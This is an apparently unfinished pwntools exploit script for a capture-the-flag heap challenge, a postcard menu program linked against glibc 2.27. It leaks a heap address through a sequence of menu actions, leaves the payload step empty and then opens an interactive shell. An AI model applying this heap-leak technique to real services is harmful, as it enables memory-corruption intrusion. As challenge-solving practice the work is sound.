from pwn import *
import sys

argv = sys.argv

DEBUG = False
BINARY = argv[1]
elf = ELF(BINARY)
libc = ELF('./libc-2.27.so')


context.binary = BINARY
context.terminal = ['tmux', 'new-window']

def attach_gdb(sh):
	gdb.attach(sh)


if DEBUG:
	context.log_level = 'debug'

def connect():
    if len(argv) < 3:
    	stdout = process.PTY
    	stdin = process.PTY

    	sh = process(["/glibc/2.27/64/lib/ld-2.27.so", BINARY], env={"LD_PRELOAD" : "./libc-2.27.so"}, stdout=stdout, stdin=stdin)

    	if DEBUG:
    		attach_gdb(sh)

    	REMOTE = False
    else:
    	NC = sys.argv[2]
    	ip = NC.split(":")[0]
    	port = int(NC.split(":")[1])
    	sh = remote(ip, port)
    	REMOTE = True
    return sh

def runCommand(com, env, sh):
    sh.sendlineafter("4) Read a postcard\n", str(com))
    sh.sendlineafter("#?\n", str(env))
    return sh.recvuntil("OPTIONS").split(b'\n')[0]

def getHeapAddr(sh):
    runCommand(1, 0, sh)
    runCommand(3, 0, sh)
    runCommand(3, 0, sh)
    return runCommand(4, 0, sh)

# Cool!
splash()

# Connect to local/remote process
sh = connect()

# Get heap address
print(getHeapAddr(sh).hex())

# Send payload

# Open shell
sh.interactive()